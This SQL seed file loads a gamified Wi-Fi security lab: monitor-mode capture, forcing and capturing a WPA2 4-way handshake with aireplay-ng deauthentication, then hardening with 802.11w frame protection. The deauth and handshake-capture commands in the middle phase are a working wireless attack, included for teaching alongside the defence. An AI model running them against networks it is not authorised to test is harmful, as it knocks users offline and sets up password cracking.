-- ═══════════════════════════════════════════════════════════════════
-- Lab (id=41) — Wireless LAN Fundamentals : full content (Vol 2 · Ch 18-19)
-- ═══════════════════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Pull a real 802.11 capture out of the air and learn to read it — beacons, probes, and the 4-way handshake that either protects a network or gives it away.'
WHERE id = 41;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'Put Your Card Into Monitor Mode',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 1 of 3</span>
<h3>Put Your Card Into Monitor Mode</h3>
<p>Every Wi-Fi frame that's ever mattered to an attacker or a defender — the network announcing itself, a device asking to join, the cryptographic handshake that proves a password is correct — is sitting in the air around you right now, readable by anyone with a card in monitor mode. This lab is about learning to actually read it.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 500 XP</span>
<span class="chip diff">◆ Difficulty: ★★☆☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: monitor mode · 802.11 frame types · beacon/probe/association frames</span>
</div>

## Your arsenal

A wireless-capable adapter on Kali that supports monitor mode (most USB Wi-Fi adapters used for pentesting do; built-in laptop cards vary).

<ul class="objectives">
<li>Put your wireless interface into monitor mode</li>
<li>Capture live 802.11 traffic</li>
<li>Identify a beacon frame and a probe request in the raw capture</li>
</ul>

## Step 1 — Enable monitor mode

```
sudo apt install -y aircrack-ng
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```
Your interface is now `wlan0mon` (or similar) — instead of only seeing traffic addressed to you, it sees every 802.11 frame in range, management and control frames included.

## Step 2 — See every network around you

```
sudo airodump-ng wlan0mon
```
This alone is management-frame reconnaissance: every AP within range is continuously broadcasting **beacon frames** announcing its SSID, supported rates, and security type — completely unauthenticated, by design, so any device can find it.

## Step 3 — Capture to a file for closer reading

```
sudo airodump-ng wlan0mon -w /tmp/capture --output-format pcap
```
Let it run 30-60 seconds, then `Ctrl+C` and open it properly:
```
wireshark /tmp/capture-01.cap
```

<div class="callout tip">
<p>Filter on <code>wlan.fc.type_subtype == 0x08</code> for beacon frames. Every single one you see is an AP shouting its own existence into the air, dozens of times a second, whether or not anyone's listening.</p>
</div>

<div class="achievement">
<span class="medal">📡</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Tuned In — the air was always this noisy, you just couldn't see it before</span></span>
</div>

**Next:** Phase 2 — find the one sequence of frames that actually matters if you're trying to recover a password.
$md$
WHERE lab_id = 41 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Find the Handshake',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 2 of 3</span>
<h3>Find the Handshake</h3>
<p>This isn't a "break in" phase — it's a speed challenge. Somewhere in a live capture is a specific four-frame sequence: the WPA2 4-way handshake, exchanged every time a client joins a protected network. Everything a real cracking attempt (like the one in the Wireless Evil Twin lab) actually needs starts with correctly spotting these four frames in a sea of everything else.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 700 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~10 min</span>
<span class="chip loot">⚿ Loot: EAPOL frame identification · association process · handshake capture</span>
</div>

## Step 1 — Lock onto one specific network

```
sudo airodump-ng wlan0mon --bssid <TARGET-BSSID> --channel <TARGET-CHANNEL> -w /tmp/handshake
```

## Step 2 — Force a fresh handshake

Real handshakes happen naturally whenever a client connects, but you can trigger one immediately by knocking an already-connected client off (their device will auto-reconnect and hand you the sequence again):

```
sudo aireplay-ng --deauth 5 -a <TARGET-BSSID> wlan0mon
```

## Step 3 — Confirm you actually captured it

```
aircrack-ng /tmp/handshake-01.cap
```

<div class="callout tip">
<p><strong>💥 That's the moment.</strong> Look for <code>WPA (1 handshake)</code> in the output. Open the same file in Wireshark and filter on <code>eapol</code> — you should see exactly four frames: Message 1 (AP→client, a nonce), Message 2 (client→AP, its own nonce plus a MIC), Message 3 (AP→client, confirms and installs the key), Message 4 (client→AP, acknowledges). This four-frame exchange is the entire cryptographic proof that both sides know the real password, without ever sending the password itself.</p>
</div>

<div class="achievement">
<span class="medal">🤝</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Handshake Spotted — four frames, correctly identified, out of thousands</span></span>
</div>

**Next:** Phase 3 — the one frame type that made this whole capture possible in the first place, and how to make it a lot less useful to an attacker.
$md$
WHERE lab_id = 41 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Protect the Management Frames',
  content = $md$
<div class="mission">
<span class="tag">◈ Mission Briefing — Phase 3 of 3</span>
<h3>Protect the Management Frames</h3>
<p>The deauth frame you just used to force a handshake is itself the problem: in classic 802.11, management frames (beacons, probe requests/responses, association, <strong>and deauthentication</strong>) are completely unauthenticated. Anyone can forge a deauth frame claiming to be the AP, and every client believes it instantly. <strong>802.11w — Management Frame Protection</strong> fixes exactly this by cryptographically signing management frames, using keys already established from the same handshake you just captured.</p>
</div>

<div class="stats">
<span class="chip xp">✦ 800 XP</span>
<span class="chip diff">◆ Difficulty: ★★★☆☆</span>
<span class="chip time">◷ ~15 min</span>
<span class="chip loot">⚿ Loot: 802.11w / Management Frame Protection · WPA2 vs. WPA3 baseline requirements</span>
</div>

<ul class="objectives">
<li>Confirm the network is at minimum WPA2, never WEP or fully open</li>
<li>Enable 802.11w (Management Frame Protection) on the AP/WLC</li>
<li>Re-run the deauth → the forged frame is rejected, not honored</li>
</ul>

## Fix 1 — Confirm the baseline is actually WPA2 or better

```
sudo airodump-ng wlan0mon
```
Look at the `ENC` column for your target — anything showing `WEP` or `OPN` (open) has no meaningful protection to begin with, handshake or not.

## Fix 2 — Enable Management Frame Protection

On a Cisco WLC (or the equivalent setting on any modern AP), turn on 802.11w:

```
! WLC GUI/CLI equivalent, conceptually:
config wlan security wpa akm pmf optional <wlan-id>
! "required" forces it; "optional" allows both PMF and legacy clients during migration
```
Once required, every management frame — including deauth and disassociation — is signed with a key derived during the 4-way handshake. A forged deauth from an attacker who was never part of that handshake gets silently dropped.

## Re-run the attack (the fun part)

```
sudo aireplay-ng --deauth 5 -a <TARGET-BSSID> wlan0mon
```

<div class="callout tip">
<p>The client stays associated. With PMF enforced, an unsigned deauth frame simply isn't honored — the client's radio driver checks the signature, finds none, and ignores it. The same command that reliably knocked a client offline in Phase 2 now does nothing at all.</p>
</div>

## Prove it to the grader

```
sudo airodump-ng wlan0mon
! ENC column shows WPA2 or WPA3, and the network's capability info confirms PMF is active
```

<div class="achievement">
<span class="medal">🛡️</span>
<span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Signed and Sealed — even the frames that used to lie for free now have to prove it</span></span>
</div>

<div class="mission">
<span class="tag">✔ LAB COMPLETE</span>
<h3>Wireless LAN Fundamentals — cleared</h3>
<p>You learned to read the air itself — beacons, probes, and the four-frame handshake that's the real foundation of every WPA2 cracking attempt. Then you closed the door that made forcing that handshake trivial in the first place: unauthenticated management frames, fixed by 802.11w.</p>
<p><strong>Total: 2000 XP</strong> · Next target: <code>WLAN Configuration</code>, where you'll stand up the controller infrastructure behind all of this from scratch.</p>
</div>
$md$
WHERE lab_id = 41 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  41,
  $svg$<svg viewBox="0 0 320 140" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <circle cx="80" cy="70" r="30" fill="#fff" stroke="#0d7050" stroke-width="1.6"/>
  <text x="80" y="74" text-anchor="middle" font-size="9" fill="#0d7050" font-weight="600">AP</text>
  <rect x="200" y="55" width="90" height="30" rx="6" fill="#fff" stroke="#c02a30" stroke-width="1.6"/>
  <text x="245" y="74" text-anchor="middle" font-size="9" fill="#c02a30" font-weight="600">KALI mon0</text>
  <path d="M 110 60 Q 150 40 195 62" stroke="#0d7050" stroke-width="1.5" fill="none" stroke-dasharray="3 3"/>
  <path d="M 110 80 Q 150 100 195 78" stroke="#0d7050" stroke-width="1.5" fill="none" stroke-dasharray="3 3"/>
</svg>$svg$,
  $svg$<svg viewBox="0 0 700 240" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <circle cx="160" cy="120" r="60" fill="#fff" stroke="#0d7050" stroke-width="1.8"/>
  <text x="160" y="116" text-anchor="middle" font-size="13" fill="#0d7050" font-weight="700">AP</text>
  <text x="160" y="132" text-anchor="middle" font-size="8" fill="#6b7480">beacons + PMF</text>
  <rect x="330" y="40" width="160" height="46" rx="8" fill="#fff" stroke="#1d4fc7" stroke-width="1.6"/>
  <text x="410" y="62" text-anchor="middle" font-size="12" fill="#1d4fc7" font-weight="600">Client</text>
  <text x="410" y="76" text-anchor="middle" font-size="8" fill="#6b7480">4-way handshake</text>
  <rect x="500" y="150" width="170" height="50" rx="9" fill="#fff" stroke="#c02a30" stroke-width="1.8"/>
  <text x="585" y="172" text-anchor="middle" font-size="12" fill="#c02a30" font-weight="600">KALI · monitor mode</text>
  <text x="585" y="188" text-anchor="middle" font-size="8" fill="#6b7480">captures + forged deauth (blocked by PMF)</text>
  <path d="M 220 100 Q 280 60 330 63" stroke="#0d7050" stroke-width="2" fill="none"/>
  <path d="M 220 140 Q 350 200 500 175" stroke="#c02a30" stroke-width="2" fill="none" stroke-dasharray="6 5"/>
</svg>$svg$,
  $json$["Access point", "Legitimate client", "Attacker (passive capture + deauth attempt)"]$json$::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
